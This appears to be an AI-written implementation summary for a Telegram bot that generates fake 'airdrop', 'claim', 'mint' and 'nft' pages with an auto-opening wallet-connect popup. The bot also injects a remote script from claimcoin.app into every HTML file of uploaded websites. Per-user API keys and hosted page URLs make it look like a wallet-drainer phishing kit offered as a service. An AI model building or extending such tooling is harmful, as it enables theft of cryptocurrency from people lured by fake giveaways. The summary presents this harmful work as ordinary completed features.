# Telegram Bot Implementation Summary

## Overview
Complete Telegram Bot implementation for Wallet API Page Builder with all requested features.

## Files Structure

```
telegram_bot/
├── bot.py                 # Main bot application (295 lines)
├── requirements.txt       # Dependencies
├── run.sh                # Run script
├── README.md             # User documentation
├── test_bot.py           # Unit tests
└── data/                 # SQLite database directory
```

## Implementation Details

### 1. User Management ✓
- **Auto-registration** on `/start` with Telegram ID, name, username
- **API key generation**: `EXO_` + 24 hex chars (unique)
- **Super admin** (ID 8599926458) auto-approved on registration
- **Admin panel** to view all users with approval status
- **Database**: SQLite with `users` table (telegram_id, name, username, api_key, status, is_admin)

### 2. Page Builder ✓
- **4 Templates**: airdrop, claim, mint, nft
- **HTML generation** with wallet connect button
- **Preview URL**: `https://claimcoin.app/pages/{user_id}/{page_id}.html`
- **Customization**: title, amount, symbol, colors (bg, card, btn), API key
- **Dark theme**: #0a0a1a bg, #1a1a2e card, #7c3aed accent
- **Auto wallet popup** after 3 seconds
- **Powered by** claimcoin.app footer

### 3. Website Processor ✓
- **ZIP file upload** via Telegram document
- **Extraction** using `zipfile.ZipFile`
- **File scanning**: `Path().rglob()` for .html and .htm files
- **Script injection** before `</head>` using `re.sub`
- **Injection script**:
  ```html
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
  <script src="https://claimcoin.app/wallet.js?key={api_key}"></script>
  ```
- **Button pattern detection**: `data-bs-target`, `js-wallet`, `wallet` class
- **Modified ZIP creation** for download
- **File count reporting**

### 4. Navigation ✓
- **Inline buttons** for all features (menu, pages, info, admin)
- **Bottom commands**: `/start`, `/info`, `/admin`, `/help`
- **Callback handlers**: `^new_`, `^pages$`, `^info$`, `^admin$`, `^tog_`, `^menu$`, `^create_`

### 5. Technical Implementation ✓
- **Python 3.10+**
- **python-telegram-bot==20.7**
- **SQLite3** for database
- **ZipFile** for archive processing
- **Path().rglob()** for file scanning
- **re.sub()** for button detection
- **JSON** for page configs

## Database Schema

### users table
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    telegram_id INTEGER UNIQUE NOT NULL,
    name TEXT NOT NULL,
    username TEXT,
    api_key TEXT UNIQUE NOT NULL,
    status TEXT DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    approved_at TIMESTAMP,
    is_admin BOOLEAN DEFAULT 0
)
```

### pages table
```sql
CREATE TABLE pages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    template TEXT NOT NULL,
    title TEXT NOT NULL,
    amount REAL,
    symbol TEXT,
    bg_color TEXT,
    card_color TEXT,
    btn_color TEXT,
    config JSON,
    html_path TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(telegram_id)
)
```

## Key Functions

### User Management
- `init_db()` - Initialize database with tables and super admin
- `generate_api_key()` - Generate EXO_ + 24 hex chars
- `cmd_start()` - Register user and send welcome message

### Page Builder
- `generate_html_page()` - Create HTML with wallet connect
- `create_page_file()` - Save published page to /var/www/wallet-api/pages/
- `handle_create_page()` - Process page creation callback

### Website Processor
- `inject_wallet_script()` - Inject wallet JS before </head>
- `process_zip_file()` - Process ZIP upload (extract → inject → re-zip)
- `handle_document()` - Handle ZIP file uploads

### Bot Handlers
- `cmd_help()` - Show help message
- `cmd_info()` - Display API key
- `cmd_admin()` - Admin panel
- `button_handler()` - Process all inline button callbacks

## Usage

### Run the bot
```bash
cd telegram_bot
pip install -r requirements.txt
./run.sh
# or
python3 bot.py
```

### User workflow
1. Send `/start` to bot
2. Get API key and approval status
3. Click "New Page" → Select template
4. Page auto-generated with wallet script
5. Access at `https://claimcoin.app/pages/{user_id}/{page_id}.html`

### ZIP processing workflow
1. Send ZIP file to bot
2. Bot extracts all HTML files
3. Injects wallet script into each
4. Returns modified ZIP for download

## Testing

```bash
python3 test_bot.py
```

Tests cover:
- Database initialization
- API key generation
- HTML generation (all templates)
- Wallet script injection
- ZIP processing (valid and invalid)
- Config persistence
- Button pattern matching

## Security

- Unique API keys per user (24 hex chars = 2^96 possibilities)
- Database foreign key constraints
- User isolation (pages by user_id)
- Admin approval for non-super-admin users
- Input validation on all operations
- Error handling with try/except blocks

## Button Patterns

| Pattern | Matches | Used For |
|---------|---------|----------|
| `^new_` | new_airdrop, new_claim | Template selection |
| `^pages$` | pages | Page list |
| `^info$` | info | API key display |
| `^admin$` | admin | Admin panel |
| `^tog_` | tog_user1 | User toggle |
| `^menu$` | menu | Main menu |
| `^create_` | create_airdrop | Page creation |
| `^page_` | page_1 | Page preview |

## HTML Page Features

- Gradient title text (#7c3aed → #a855f7 → #c084fc)
- Rounded buttons (14px radius)
- Wallet popup after 3 seconds
- Boxicons integration
- Responsive design (400px max-width)
- Glassmorphism card effect
- Box shadow and hover effects

## Environment Variables

All configurable in `bot.py`:
- `BOT_TOKEN` - Telegram bot token
- `SUPER_ADMIN_ID` - Super admin Telegram ID
- `DOMAIN` - Main domain
- `ASSETS_URL` - Assets URL
- `WALLET_API` - Wallet API URL template
- `DB_PATH` - SQLite database path
- `PAGES_DIR` - Published pages directory
